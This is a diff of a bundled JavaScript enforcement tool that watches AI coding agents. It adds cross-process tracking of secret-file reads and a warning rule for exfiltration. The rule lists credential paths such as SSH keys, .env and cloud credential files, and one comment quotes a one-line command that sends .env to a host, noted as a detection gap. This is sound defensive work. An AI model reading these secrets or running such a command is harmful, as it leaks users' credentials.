@@ -8376,9 +8376,16 @@ var EnforcementPipeline = class {
         }
         if (deepChecks && rule.type === "flow" && rule.sources && rule.sinks) {
           this.config.flowTracker.record(input, rule);
-          const flowResult = this.config.flowTracker.check(input, rule);
-          if (flowResult) {
-            return this.violation(input, rule, flowResult, start, 6);
+          if (rule.cross_call) {
+            const flowResult = this.config.flowTracker.checkPersisted(input, rule);
+            if (flowResult) {
+              return this.violation(input, rule, flowResult, start, 6);
+            }
+          } else {
+            const flowResult = this.config.flowTracker.check(input, rule);
+            if (flowResult) {
+              return this.violation(input, rule, flowResult, start, 6);
+            }
           }
         }
         if (rule.type === "session" && rule.max_duration_minutes) {
@@ -8890,6 +8897,10 @@ var SequenceDetector = class {
 // ../core/src/enforce/flow-tracker.ts
 import { existsSync as existsSync6 } from "node:fs";
 var FlowTracker = class {
+  constructor(persistentStore) {
+    this.persistentStore = persistentStore;
+  }
+  persistentStore;
   taggedValues = /* @__PURE__ */ new Map();
   // tag_key → tool name that created the tag
   tagOrigins = /* @__PURE__ */ new Map();
@@ -8918,6 +8929,14 @@ var FlowTracker = class {
         existing.push(tag);
         this.taggedValues.set(key, existing);
         this.tagOrigins.set(key, input.tool);
+        if (this.persistentStore && typeof rule === "object") {
+          this.persistentStore.recordTag(input.session_id, {
+            source: matchedRule,
+            timestamp: tag.timestamp,
+            originTool: input.tool,
+            path: path2
+          });
+        }
       }
     }
     const command = String(args.command || args.cmd || "");
@@ -8927,15 +8946,23 @@ var FlowTracker = class {
       if (commandSource) {
         const key = `flow:${input.session_id}:${input.turn_number}`;
         const existing = this.taggedValues.get(key) || [];
+        const commandTimestamp = Date.now();
         existing.push({
           source: commandSource,
           value: `<redacted: command read of sensitive path>`,
-          timestamp: Date.now(),
+          timestamp: commandTimestamp,
           sessionId: input.session_id,
           originTool: input.tool
         });
         this.taggedValues.set(key, existing);
         this.tagOrigins.set(key, input.tool);
+        if (this.persistentStore && typeof rule === "object") {
+          this.persistentStore.recordTag(input.session_id, {
+            source: commandSource,
+            timestamp: commandTimestamp,
+            originTool: input.tool
+          });
+        }
       }
     }
     if (this.taggedValues.size > 1e3) {
@@ -8969,6 +8996,45 @@ var FlowTracker = class {
       return `Data flow violation: data from ${sources} flowing to ${sinks} (rule: ${rule.id})`;
     }
     return null;
+  }
+  /**
+   * Cross-call correlation for hook-invoked hosts (`keel hook <host>` —
+   * Claude Code, Gemini CLI, Cursor, Codex, cline, generic): a fresh
+   * process per tool call means `check()`'s in-memory `taggedValues` is
+   * always empty at the start of a later call, so it can never see a read
+   * an EARLIER, already-exited process recorded. This method answers the
+   * identical question — "did a source get tagged this session, and is
+   * this call a sink" — against the persisted, session-scoped, TTL'd store
+   * (flow-store.ts) instead, so that earlier process's tag is still
+   * visible here.
+   *
+   * Deliberately NOT folded into `check()`: `check()` backs the existing
+   * `level: protect` `no-exfil-flow` deny, a hard, undialable floor (see
+   * docs/exfil.md's "Design choice" section for why that stays a hard
+   * deny). Cross-process correlation has a materially wider
+   * false-positive shape — it survives an hour (FLOW_TAG_TTL_MS), not one
+   * live process/command — and is deliberately shipped at a softer tier
+   * instead: see install.ts's `no-exfil-flow-cross-call` (action: warn,
+   * level: sprint, cross_call: true). Returns null when no persistent
+   * store was supplied to the constructor (every `new FlowTracker()` call
+   * site that predates this — the default stays pure in-memory) exactly
+   * like `check()` returns null when `rule.sources`/`rule.sinks` are
+   * missing.
+   */
+  checkPersisted(input, rule) {
+    if (!this.persistentStore || !rule.sources || !rule.sinks) return null;
+    const args = input.args;
+    const tool = input.tool;
+    const isSink = rule.sinks.some((sink) => this.matchesSink(sink, tool, args));
+    if (!isSink) return null;
+    const tags = this.persistentStore.getTags(input.session_id);
+    const hasSourceData = tags.some((tag) => rule.sources.some(
+      (source) => tag.originTool.toLowerCase().includes(source.toLowerCase()) || !!tag.path && this.pathMatches(tag.path, source) || !!tag.source && this.sourceMatches(source, tag.source)
+    ));
+    if (!hasSourceData) return null;
+    const sources = rule.sources.join(", ");
+    const sinks = rule.sinks.join(", ");
+    return `Cross-call data flow correlation (this session, an earlier hook process): data from ${sources} flowing to ${sinks} (rule: ${rule.id})`;
   }
   /** Does a read command reference a configured source pattern? */
   commandSourceMatches(command, pattern) {
@@ -9032,6 +9098,303 @@ var FlowTracker = class {
     this.tagOrigins.clear();
   }
 };
+
+// ../core/src/enforce/flow-store.ts
+import { readFileSync as readFileSync9, writeFileSync as writeFileSync5, existsSync as existsSync8, mkdirSync as mkdirSync5, renameSync as renameSync4 } from "node:fs";
+import { join as join6 } from "node:path";
+
+// ../core/src/enforce/file-lock.ts
+import { openSync as openSync2, writeSync, closeSync as closeSync2, unlinkSync as unlinkSync2, statSync as statSync3, readFileSync as readFileSync7 } from "node:fs";
+var DEFAULT_TIMEOUT_MS = 5e3;
+var DEFAULT_STALE_MS = 8e3;
+var INITIAL_BACKOFF_MS = 4;
+var MAX_BACKOFF_MS = 60;
+function sleepSync(ms) {
+  if (ms <= 0) return;
+  try {
+    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
+  } catch {
+    const end = Date.now() + ms;
+    while (Date.now() < end) {
+    }
+  }
+}
+var tokenCounter = 0;
+function makeToken() {
+  tokenCounter += 1;
+  return `${process.pid}:${Date.now()}:${tokenCounter}:${Math.random().toString(36).slice(2)}`;
+}
+function classifyLockError(code, flavor = currentFlavor()) {
+  if (code === "EEXIST") return "contention";
+  if (flavor === "win32" && (code === "EBUSY" || code === "EPERM")) return "contention";
+  return "fatal";
+}
+function unlinkWithRetry(path2, attempts = 5, delayMs = 5) {
+  for (let i = 0; i < attempts; i++) {
+    try {
+      unlinkSync2(path2);
+      return;
+    } catch (err) {
+      const code = err.code;
+      if (code === "ENOENT") return;
+      if (i === attempts - 1) throw err;
+      sleepSync(delayMs * (i + 1));
+    }
+  }
+}
+function acquireLock(lockPath, options = {}) {
+  const timeoutMs = options.timeoutMs ?? DEFAULT_TIMEOUT_MS;
+  const staleMs = options.staleMs ?? DEFAULT_STALE_MS;
+  const deadline = Date.now() + timeoutMs;
+  let backoff = INITIAL_BACKOFF_MS;
+  for (; ; ) {
+    try {
+      const fd = openSync2(lockPath, "wx");
+      const token = makeToken();
+      try {
+        writeSync(fd, token);
+      } finally {
+        closeSync2(fd);
+      }
+      return token;
+    } catch (err) {
+      if (classifyLockError(err.code) !== "contention") {
+        return null;
+      }
+    }
+    try {
+      const heldFor = Date.now() - statSync3(lockPath).mtimeMs;
+      if (heldFor > staleMs) {
+        try {
+          unlinkWithRetry(lockPath);
+        } catch {
+        }
+        continue;
+      }
+    } catch {
+      continue;
+    }
+    if (Date.now() >= deadline) return null;
+    const jittered = Math.random() * backoff;
+    sleepSync(Math.min(jittered, Math.max(0, deadline - Date.now())));
+    backoff = Math.min(backoff * 2, MAX_BACKOFF_MS);
+  }
+}
+function releaseLock(lockPath, token) {
+  try {
+    if (token !== void 0) {
+      const current = readFileSync7(lockPath, "utf-8");
+      if (current !== token) return;
+    }
+    unlinkWithRetry(lockPath);
+  } catch {
+  }
+}
+function withFileLock(lockPath, fn, options = {}) {
+  const token = acquireLock(lockPath, options);
+  try {
+    return fn();
+  } finally {
+    if (token !== null) releaseLock(lockPath, token);
+  }
+}
+
+// ../core/src/enforce/state-manager.ts
+import { readFileSync as readFileSync8, writeFileSync as writeFileSync4, existsSync as existsSync7, mkdirSync as mkdirSync4, renameSync as renameSync3 } from "node:fs";
+import { join as join5 } from "node:path";
+function stateDir() {
+  return process.env.KEEL_STATE_DIR || join5(resolveHome(), ".keel", "state");
+}
+var TTL_MS = 24 * 60 * 60 * 1e3;
+var StateManager = class {
+  denyFirstTime = {};
+  circuitBreaker = {};
+  rateCounts = {};
+  verification = {};
+  oracleFailures = {};
+  dir;
+  lockOptions;
+  /**
+   * `lockOptions` overrides file-lock.ts's default wait/stale-reclaim
+   * bounds — production code should never need this (the defaults are
+   * tuned for a hook invocation), but tests that deliberately create
+   * heavy artificial contention need a wider wait than the production
+   * default without that production default having to grow to
+   * accommodate a synthetic worst case it will never see in the field.
+   */
+  constructor(dir = stateDir(), lockOptions = {}) {
+    this.dir = dir;
+    this.lockOptions = lockOptions;
+    this.load();
+  }
+  statePath(name) {
+    return join5(this.dir, `${name}.json`);
+  }
+  lockPath(name) {
+    return this.statePath(name) + ".lock";
+  }
+  ensureDir() {
+    try {
+      mkdirSync4(this.dir, { recursive: true });
+    } catch {
+    }
+  }
+  /** Run `fn` holding the lock for state slice `name`, serializing with other processes. */
+  withSliceLock(name, fn) {
+    this.ensureDir();
+    return withFileLock(this.lockPath(name), fn, this.lockOptions);
+  }
+  loadFile(name, fallback) {
+    const p = this.statePath(name);
+    try {
+      if (existsSync7(p)) {
+        return JSON.parse(readFileSync8(p, "utf-8"));
+      }
+    } catch {
+    }
+    return fallback;
+  }
+  saveFile(name, data) {
+    try {
+      mkdirSync4(this.dir, { recursive: true });
+      const p = this.statePath(name);
+      const tmp = p + ".tmp";
+      writeFileSync4(tmp, JSON.stringify(data));
+      renameSync3(tmp, p);
+    } catch {
+    }
+  }
+  loadDenyFirstTime() {
+    const now = Date.now();
+    const raw = this.loadFile("deny-first-time", {});
+    const cleaned = {};
+    for (const [ruleId, value] of Object.entries(raw)) {
+      const timestamp2 = typeof value === "number" ? value : value.timestamp;
+      if (now - timestamp2 < TTL_MS) cleaned[ruleId] = value;
+    }
+    return cleaned;
+  }
+  loadCircuitBreaker() {
+    const now = Date.now();
+    const raw = this.loadFile("circuit-breaker", {});
+    const cleaned = {};
+    for (const [key, val] of Object.entries(raw)) {
+      if (now - val.startTime < TTL_MS) cleaned[key] = val;
+    }
+    return cleaned;
+  }
+  loadRateCounts() {
+    const now = Date.now();
+    const raw = this.loadFile("rate-counts", {});
+    const cleaned = {};
+    for (const [key, val] of Object.entries(raw)) {
+      if (now - val.windowStart < TTL_MS) cleaned[key] = val;
+    }
+    return cleaned;
+  }
+  loadVerificationState() {
+    const now = Date.now();
+    const raw = this.loadFile("verification", {});
+    const cleaned = {};
+    for (const [key, val] of Object.entries(raw)) {
+      if (now - val.createdAt < TTL_MS) cleaned[key] = val;
+    }
+    return cleaned;
+  }
+  loadOracleFailuresState() {
+    const now = Date.now();
+    const raw = this.loadFile("oracle-failures", {});
+    const cleaned = {};
+    for (const [key, val] of Object.entries(raw)) {
+      if (now - val.timestamp < TTL_MS) cleaned[key] = val;
+    }
+    return cleaned;
+  }
+  load() {
+    this.denyFirstTime = this.loadDenyFirstTime();
+    this.circuitBreaker = this.loadCircuitBreaker();
+    this.rateCounts = this.loadRateCounts();
+    this.verification = this.loadVerificationState();
+    this.oracleFailures = this.loadOracleFailuresState();
+  }
+  /** Mark a rule as having been violated (first time). */
+  markFirstTime(ruleId, version) {
+    this.withSliceLock("deny-first-time", () => {
+      this.denyFirstTime = this.loadDenyFirstTime();
+      this.denyFirstTime[ruleId] = version ? { timestamp: Date.now(), version } : Date.now();
+      this.saveFile("deny-first-time", this.denyFirstTime);
+    });
+  }
+  /** Check if a rule has been violated before. */
+  isFirstTime(ruleId, version) {
+    const value = this.denyFirstTime[ruleId];
+    if (value === void 0) return true;
+    if (!version) return false;
+    return typeof value === "number" || value.version !== version;
+  }
+  /** Record a circuit breaker event. Returns true if threshold (3+) reached. */
+  recordCircuitBreaker(ruleId, tool) {
+    const key = `${ruleId}:${tool}`;
+    return this.withSliceLock("circuit-breaker", () => {
+      this.circuitBreaker = this.loadCircuitBreaker();
+      const now = Date.now();
+      const existing = this.circuitBreaker[key];
+      if (existing && now - existing.startTime < 6e4) {
+        existing.count++;
+        this.circuitBreaker[key] = existing;
+      } else {
+        this.circuitBreaker[key] = { count: 1, startTime: now };
+      }
+      this.saveFile("circuit-breaker", this.circuitBreaker);
+      return this.circuitBreaker[key].count >= 3;
+    });
+  }
+  /** Check and increment rate limit. Returns true if over limit. */
+  checkRateLimit(ruleId, matchPattern, windowSec, maxCalls) {
+    const key = `rate:${ruleId}:${matchPattern}`;
+    return this.withSliceLock("rate-counts", () => {
+      this.rateCounts = this.loadRateCounts();
+      const now = Date.now();
+      const existing = this.rateCounts[key];
+      let overLimit;
+      if (existing && now - existing.windowStart < windowSec * 1e3) {
+        existing.count++;
+        this.rateCounts[key] = existing;
+        overLimit = existing.count > maxCalls;
+      } else {
+        this.rateCounts[key] = { count: 1, windowStart: now };
+        overLimit = false;
+      }
+      this.saveFile("rate-counts", this.rateCounts);
+      return overLimit;
+    });
+  }
+  setVerification(key, value) {
+    this.withSliceLock("verification", () => {
+      this.verification = this.loadVerificationState();
+      this.verification[key] = value;
+      this.saveFile("verification", this.verification);
+    });
+  }
+  clearVerification(key) {
+    this.withSliceLock("verification", () => {
+      this.verification = this.loadVerificationState();
+      delete this.verification[key];
+      this.saveFile("verification", this.verification);
+    });
+  }
+  /** Record a failing test run for the oracle-tampering detector's recency window. */
+  setOracleFailure(key, value) {
+    this.withSliceLock("oracle-failures", () => {
+      this.oracleFailures = this.loadOracleFailuresState();
+      this.oracleFailures[key] = value;
+      this.saveFile("oracle-failures", this.oracleFailures);
+    });
+  }
+};
+
+// ../core/src/enforce/flow-store.ts
+var FLOW_TAG_TTL_MS = 60 * 60 * 1e3;
 
 // ../core/src/enforce/command-fingerprint.ts
 function commandFingerprint(command) {
@@ -9220,109 +9583,13 @@ var ResearchTracker = class {
 };
 
 // ../core/src/enforce/problem-ledger.ts
-import { existsSync as existsSync7, mkdirSync as mkdirSync4, readFileSync as readFileSync8, writeFileSync as writeFileSync4, renameSync as renameSync3, statSync as statSync4 } from "node:fs";
-import { join as join5 } from "node:path";
+import { existsSync as existsSync9, mkdirSync as mkdirSync6, readFileSync as readFileSync10, writeFileSync as writeFileSync6, renameSync as renameSync5, statSync as statSync4 } from "node:fs";
+import { join as join7 } from "node:path";
 import { createHash as createHash2 } from "node:crypto";
 
-// ../core/src/enforce/file-lock.ts
-import { openSync as openSync2, writeSync, closeSync as closeSync2, unlinkSync as unlinkSync2, statSync as statSync3, readFileSync as readFileSync7 } from "node:fs";
-var DEFAULT_TIMEOUT_MS = 5e3;
-var DEFAULT_STALE_MS = 8e3;
-var INITIAL_BACKOFF_MS = 4;
-var MAX_BACKOFF_MS = 60;
-function sleepSync(ms) {
-  if (ms <= 0) return;
-  try {
-    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
-  } catch {
-    const end = Date.now() + ms;
-    while (Date.now() < end) {
-    }
-  }
-}
-var tokenCounter = 0;
-function makeToken() {
-  tokenCounter += 1;
-  return `${process.pid}:${Date.now()}:${tokenCounter}:${Math.random().toString(36).slice(2)}`;
-}
-function classifyLockError(code, flavor = currentFlavor()) {
-  if (code === "EEXIST") return "contention";
-  if (flavor === "win32" && (code === "EBUSY" || code === "EPERM")) return "contention";
-  return "fatal";
-}
-function unlinkWithRetry(path2, attempts = 5, delayMs = 5) {
-  for (let i = 0; i < attempts; i++) {
-    try {
-      unlinkSync2(path2);
-      return;
-    } catch (err) {
-      const code = err.code;
-      if (code === "ENOENT") return;
-      if (i === attempts - 1) throw err;
-      sleepSync(delayMs * (i + 1));
-    }
-  }
-}
-function acquireLock(lockPath, options = {}) {
-  const timeoutMs = options.timeoutMs ?? DEFAULT_TIMEOUT_MS;
-  const staleMs = options.staleMs ?? DEFAULT_STALE_MS;
-  const deadline = Date.now() + timeoutMs;
-  let backoff = INITIAL_BACKOFF_MS;
-  for (; ; ) {
-    try {
-      const fd = openSync2(lockPath, "wx");
-      const token = makeToken();
-      try {
-        writeSync(fd, token);
-      } finally {
-        closeSync2(fd);
-      }
-      return token;
-    } catch (err) {
-      if (classifyLockError(err.code) !== "contention") {
-        return null;
-      }
-    }
-    try {
-      const heldFor = Date.now() - statSync3(lockPath).mtimeMs;
-      if (heldFor > staleMs) {
-        try {
-          unlinkWithRetry(lockPath);
-        } catch {
-        }
-        continue;
-      }
-    } catch {
-      continue;
-    }
-    if (Date.now() >= deadline) return null;
-    const jittered = Math.random() * backoff;
-    sleepSync(Math.min(jittered, Math.max(0, deadline - Date.now())));
-    backoff = Math.min(backoff * 2, MAX_BACKOFF_MS);
-  }
-}
-function releaseLock(lockPath, token) {
-  try {
-    if (token !== void 0) {
-      const current = readFileSync7(lockPath, "utf-8");
-      if (current !== token) return;
-    }
-    unlinkWithRetry(lockPath);
-  } catch {
-  }
-}
-function withFileLock(lockPath, fn, options = {}) {
-  const token = acquireLock(lockPath, options);
-  try {
-    return fn();
-  } finally {
-    if (token !== null) releaseLock(lockPath, token);
-  }
-}
-
 // ../core/src/enforce/audit.ts
-import { appendFileSync, existsSync as existsSync8, mkdirSync as mkdirSync5, readFileSync as readFileSync9, readdirSync } from "node:fs";
-import { join as join6 } from "node:path";
+import { appendFileSync, existsSync as existsSync10, mkdirSync as mkdirSync7, readFileSync as readFileSync11, readdirSync } from "node:fs";
+import { join as join8 } from "node:path";
 
 // ../core/src/enforce/audit-redaction.ts
 var SENSITIVE_KEY = /(token|secret|password|passwd|authorization|api[_-]?key|private[_-]?key|credential)/i;
@@ -9362,18 +9629,18 @@ import {
   createHash as createHash3,
   randomUUID
 } from "node:crypto";
-import { existsSync as existsSync9, readFileSync as readFileSync10, writeFileSync as writeFileSync6, mkdirSync as mkdirSync6, appendFileSync as appendFileSync2, readdirSync as readdirSync2, renameSync as renameSync4 } from "node:fs";
-import { join as join7 } from "node:path";
+import { existsSync as existsSync11, readFileSync as readFileSync12, writeFileSync as writeFileSync8, mkdirSync as mkdirSync8, appendFileSync as appendFileSync2, readdirSync as readdirSync2, renameSync as renameSync6 } from "node:fs";
+import { join as join9 } from "node:path";
 var signingKey = null;
 function keyPath() {
-  return join7(resolveHome(), ".keel", "receipt-key.json");
+  return join9(resolveHome(), ".keel", "receipt-key.json");
 }
 function legacyKeyPath() {
-  return join7(process.cwd(), ".keel", "receipts", "receipt-key.json");
+  return join9(process.cwd(), ".keel", "receipts", "receipt-key.json");
 }
 function parseKeyFile(filePath) {
   try {
-    const parsed = JSON.parse(readFileSync10(filePath, "utf-8"));
+    const parsed = JSON.parse(readFileSync12(filePath, "utf-8"));
     return parsed && parsed.kid ? parsed : null;
   } catch {
     return null;
@@ -9407,20 +9674,20 @@ function initReceiptKey() {
   const newKey = { kid, privateJwk: privJwk, publicJwk: { ...pubJwk, kid } };
   signingKey = newKey;
   try {
-    const dir = join7(resolveHome(), ".keel");
-    if (!existsSync9(dir)) mkdirSync6(dir, { recursive: true });
-    writeFileSync6(keyPath(), JSON.stringify(newKey), { mode: 384 });
+    const dir = join9(resolveHome(), ".keel");
+    if (!existsSync11(dir)) mkdirSync8(dir, { recursive: true });
+    writeFileSync8(keyPath(), JSON.stringify(newKey), { mode: 384 });
   } catch {
   }
   return signingKey;
 }
 var receiptChain = /* @__PURE__ */ new Map();
 function receiptsLogPath() {
-  return join7(process.cwd(), ".keel", "receipts", "receipts.log");
+  return join9(process.cwd(), ".keel", "receipts", "receipts.log");
 }
 function loadReceiptChainHead(session) {
   try {
-    const lines2 = readFileSync10(receiptsLogPath(), "utf-8").split("\n").filter(Boolean);
+    const lines2 = readFileSync12(receiptsLogPath(), "utf-8").split("\n").filter(Boolean);
     for (let i = lines2.length - 1; i >= 0; i--) {
       const r = JSON.parse(lines2[i]);
       if ((r.session ?? "default") !== session) continue;
@@ -9453,20 +9720,20 @@ function createReceipt(agentId, toolName, args, verdict, ruleName, policyName, s
   receipt.signature = sign(null, Buffer.from(JSON.stringify(toHash), "utf8"), privateKey).toString("base64url");
   receiptChain.set(session, receipt.receipt_hash);
   try {
-    const dir = join7(process.cwd(), ".keel", "receipts");
-    if (!existsSync9(dir)) mkdirSync6(dir, { recursive: true });
-    appendFileSync2(join7(dir, "receipts.log"), JSON.stringify(receipt) + "\n");
+    const dir = join9(process.cwd(), ".keel", "receipts");
+    if (!existsSync11(dir)) mkdirSync8(dir, { recursive: true });
+    appendFileSync2(join9(dir, "receipts.log"), JSON.stringify(receipt) + "\n");
   } catch {
   }
   return receipt;
 }
 
 // ../core/src/file-verify.ts
-import { readFileSync as readFileSync11 } from "node:fs";
-import { extname, basename as basename2, dirname, join as join8 } from "node:path";
+import { readFileSync as readFileSync13 } from "node:fs";
+import { extname, basename as basename2, dirname, join as join10 } from "node:path";
 async function loadTypeScriptFor(filePath) {
   const { createRequire } = await import("node:module");
-  for (const root of [join8(dirname(filePath), "noop.js"), import.meta.url]) {
+  for (const root of [join10(dirname(filePath), "noop.js"), import.meta.url]) {
     try {
       const ts = createRequire(root)("typescript");
       const api = ts?.createSourceFile ? ts : ts?.default;
@@ -9500,7 +9767,7 @@ async function verifyFileSyntax(filePath) {
       case ".cts": {
         const ts = await loadTypeScriptFor(filePath);
         if (!ts) return null;
-        const source = readFileSync11(filePath, "utf-8");
+        const source = readFileSync13(filePath, "utf-8");
         const kind = ext === ".tsx" ? ts.ScriptKind.TSX : ts.ScriptKind.TS;
         const parsed = ts.createSourceFile(basename2(filePath), source, ts.ScriptTarget.Latest, false, kind);
         const diagnostics = parsed.parseDiagnostics;
@@ -9510,11 +9777,11 @@ async function verifyFileSyntax(filePath) {
         break;
       }
       case ".json":
-        JSON.parse(readFileSync11(filePath, "utf-8"));
+        JSON.parse(readFileSync13(filePath, "utf-8"));
         break;
       case ".yaml":
       case ".yml":
-        parse(readFileSync11(filePath, "utf-8"));
+        parse(readFileSync13(filePath, "utf-8"));
         break;
       default:
         return null;
@@ -9544,200 +9811,6 @@ var VERIFIABLE = /* @__PURE__ */ new Set([
 function isVerifiableFile(filePath) {
   return VERIFIABLE.has(extname(filePath).toLowerCase());
 }
-
-// ../core/src/enforce/state-manager.ts
-import { readFileSync as readFileSync12, writeFileSync as writeFileSync7, existsSync as existsSync10, mkdirSync as mkdirSync7, renameSync as renameSync5 } from "node:fs";
-import { join as join9 } from "node:path";
-function stateDir() {
-  return process.env.KEEL_STATE_DIR || join9(resolveHome(), ".keel", "state");
-}
-var TTL_MS = 24 * 60 * 60 * 1e3;
-var StateManager = class {
-  denyFirstTime = {};
-  circuitBreaker = {};
-  rateCounts = {};
-  verification = {};
-  oracleFailures = {};
-  dir;
-  lockOptions;
-  /**
-   * `lockOptions` overrides file-lock.ts's default wait/stale-reclaim
-   * bounds — production code should never need this (the defaults are
-   * tuned for a hook invocation), but tests that deliberately create
-   * heavy artificial contention need a wider wait than the production
-   * default without that production default having to grow to
-   * accommodate a synthetic worst case it will never see in the field.
-   */
-  constructor(dir = stateDir(), lockOptions = {}) {
-    this.dir = dir;
-    this.lockOptions = lockOptions;
-    this.load();
-  }
-  statePath(name) {
-    return join9(this.dir, `${name}.json`);
-  }
-  lockPath(name) {
-    return this.statePath(name) + ".lock";
-  }
-  ensureDir() {
-    try {
-      mkdirSync7(this.dir, { recursive: true });
-    } catch {
-    }
-  }
-  /** Run `fn` holding the lock for state slice `name`, serializing with other processes. */
-  withSliceLock(name, fn) {
-    this.ensureDir();
-    return withFileLock(this.lockPath(name), fn, this.lockOptions);
-  }
-  loadFile(name, fallback) {
-    const p = this.statePath(name);
-    try {
-      if (existsSync10(p)) {
-        return JSON.parse(readFileSync12(p, "utf-8"));
-      }
-    } catch {
-    }
-    return fallback;
-  }
-  saveFile(name, data) {
-    try {
-      mkdirSync7(this.dir, { recursive: true });
-      const p = this.statePath(name);
-      const tmp = p + ".tmp";
-      writeFileSync7(tmp, JSON.stringify(data));
-      renameSync5(tmp, p);
-    } catch {
-    }
-  }
-  loadDenyFirstTime() {
-    const now = Date.now();
-    const raw = this.loadFile("deny-first-time", {});
-    const cleaned = {};
-    for (const [ruleId, value] of Object.entries(raw)) {
-      const timestamp2 = typeof value === "number" ? value : value.timestamp;
-      if (now - timestamp2 < TTL_MS) cleaned[ruleId] = value;
-    }
-    return cleaned;
-  }
-  loadCircuitBreaker() {
-    const now = Date.now();
-    const raw = this.loadFile("circuit-breaker", {});
-    const cleaned = {};
-    for (const [key, val] of Object.entries(raw)) {
-      if (now - val.startTime < TTL_MS) cleaned[key] = val;
-    }
-    return cleaned;
-  }
-  loadRateCounts() {
-    const now = Date.now();
-    const raw = this.loadFile("rate-counts", {});
-    const cleaned = {};
-    for (const [key, val] of Object.entries(raw)) {
-      if (now - val.windowStart < TTL_MS) cleaned[key] = val;
-    }
-    return cleaned;
-  }
-  loadVerificationState() {
-    const now = Date.now();
-    const raw = this.loadFile("verification", {});
-    const cleaned = {};
-    for (const [key, val] of Object.entries(raw)) {
-      if (now - val.createdAt < TTL_MS) cleaned[key] = val;
-    }
-    return cleaned;
-  }
-  loadOracleFailuresState() {
-    const now = Date.now();
-    const raw = this.loadFile("oracle-failures", {});
-    const cleaned = {};
-    for (const [key, val] of Object.entries(raw)) {
-      if (now - val.timestamp < TTL_MS) cleaned[key] = val;
-    }
-    return cleaned;
-  }
-  load() {
-    this.denyFirstTime = this.loadDenyFirstTime();
-    this.circuitBreaker = this.loadCircuitBreaker();
-    this.rateCounts = this.loadRateCounts();
-    this.verification = this.loadVerificationState();
-    this.oracleFailures = this.loadOracleFailuresState();
-  }
-  /** Mark a rule as having been violated (first time). */
-  markFirstTime(ruleId, version) {
-    this.withSliceLock("deny-first-time", () => {
-      this.denyFirstTime = this.loadDenyFirstTime();
-      this.denyFirstTime[ruleId] = version ? { timestamp: Date.now(), version } : Date.now();
-      this.saveFile("deny-first-time", this.denyFirstTime);
-    });
-  }
-  /** Check if a rule has been violated before. */
-  isFirstTime(ruleId, version) {
-    const value = this.denyFirstTime[ruleId];
-    if (value === void 0) return true;
-    if (!version) return false;
-    return typeof value === "number" || value.version !== version;
-  }
-  /** Record a circuit breaker event. Returns true if threshold (3+) reached. */
-  recordCircuitBreaker(ruleId, tool) {
-    const key = `${ruleId}:${tool}`;
-    return this.withSliceLock("circuit-breaker", () => {
-      this.circuitBreaker = this.loadCircuitBreaker();
-      const now = Date.now();
-      const existing = this.circuitBreaker[key];
-      if (existing && now - existing.startTime < 6e4) {
-        existing.count++;
-        this.circuitBreaker[key] = existing;
-      } else {
-        this.circuitBreaker[key] = { count: 1, startTime: now };
-      }
-      this.saveFile("circuit-breaker", this.circuitBreaker);
-      return this.circuitBreaker[key].count >= 3;
-    });
-  }
-  /** Check and increment rate limit. Returns true if over limit. */
-  checkRateLimit(ruleId, matchPattern, windowSec, maxCalls) {
-    const key = `rate:${ruleId}:${matchPattern}`;
-    return this.withSliceLock("rate-counts", () => {
-      this.rateCounts = this.loadRateCounts();
-      const now = Date.now();
-      const existing = this.rateCounts[key];
-      let overLimit;
-      if (existing && now - existing.windowStart < windowSec * 1e3) {
-        existing.count++;
-        this.rateCounts[key] = existing;
-        overLimit = existing.count > maxCalls;
-      } else {
-        this.rateCounts[key] = { count: 1, windowStart: now };
-        overLimit = false;
-      }
-      this.saveFile("rate-counts", this.rateCounts);
-      return overLimit;
-    });
-  }
-  setVerification(key, value) {
-    this.withSliceLock("verification", () => {
-      this.verification = this.loadVerificationState();
-      this.verification[key] = value;
-      this.saveFile("verification", this.verification);
-    });
-  }
-  clearVerification(key) {
-    this.withSliceLock("verification", () => {
-      this.verification = this.loadVerificationState();
-      delete this.verification[key];
-      this.saveFile("verification", this.verification);
-    });
-  }
-  /** Record a failing test run for the oracle-tampering detector's recency window. */
-  setOracleFailure(key, value) {
-    this.withSliceLock("oracle-failures", () => {
-      this.oracleFailures = this.loadOracleFailuresState();
-      this.oracleFailures[key] = value;
-      this.saveFile("oracle-failures", this.oracleFailures);
-    });
-  }
-};
 
 // src/plugin.ts
 var EDIT_TOOLS = /* @__PURE__ */ new Set(["write", "edit", "apply_patch", "writefile", "write_file", "multiedit"]);
@@ -9984,6 +10057,33 @@ rules:
     false_positives:
       - "A deploy step that rsyncs or scps BUILD OUTPUT to a remote host, run in the same session as an earlier, unrelated read of a secret file (e.g. an env var lookup during setup), will still deny \u2014 the flow tracker has no payload correlation: it only knows a secret was read THIS session and a remote-copy sink ran, not whether the same bytes moved. rsync/scp joined the sink verb list in the M5 lane, closing a documented miss (SECURITY.md's no-exfil-flow redteam row); a single command that reads AND sends a secret in one shot (curl -d @.env host) remains a known, separate gap \u2014 the tracker needs two distinct tool calls to correlate. See docs/exfil.md."
     message: "Data read from sensitive files must not be sent over the network."
+
+  - id: no-exfil-flow-cross-call
+    type: flow
+    sources:
+      - "**/.env*"
+      - "**/.ssh/**"
+      - "**/*.pem"
+      - "**/.git-credentials"
+      - "**/.aws/credentials"
+      - "**/.config/gcloud/**"
+      - "**/Library/Keychains/**"
+      - "**/.npmrc"
+      - "**/.netrc"
+    sinks: [network]
+    action: warn
+    level: sprint
+    priority: 84
+    category: exfil
+    severity: high
+    confidence: medium
+    mode: warn
+    cross_call: true
+    rationale: "no-exfil-flow's in-memory FlowTracker only correlates a read and a later sink inside ONE live process (see docs/exfil.md). keel hook <host> (Claude Code, Gemini CLI, Cursor, Codex, cline, generic) runs a fresh process per tool call, so that correlation was inert there beyond a single piped command. This sibling rule checks the SAME sources/sinks against a persisted, session-scoped, TTL'd store (flow-store.ts, PersistentFlowStore) instead of in-memory state, so a read in one hook process and a sink in a LATER one, same session, now produces a signal too. Shipped as warn, not deny: the correlation window here is the store's TTL (about an hour), not one live process, so a legitimate build that reads a token in one call and hits the network in a later, unrelated one is a realistic hit, not an edge case a hard block could absorb."
+    remediation: "If this fires on a routine build or deploy step, it is very likely a false positive from an unrelated earlier read this session \u2014 no-exfil-flow (deny) is the rule to treat as a real interruption; this one is an early-warning signal only."
+    false_positives:
+      - "The same false-positive shape no-exfil-flow already documents (an unrelated secret read earlier in the session, followed by an unrelated network call later) \u2014 but wider, because the correlation window here spans MULTIPLE processes over the store's TTL, not one live process. This is exactly why this rule is warn/sprint, not deny/protect."
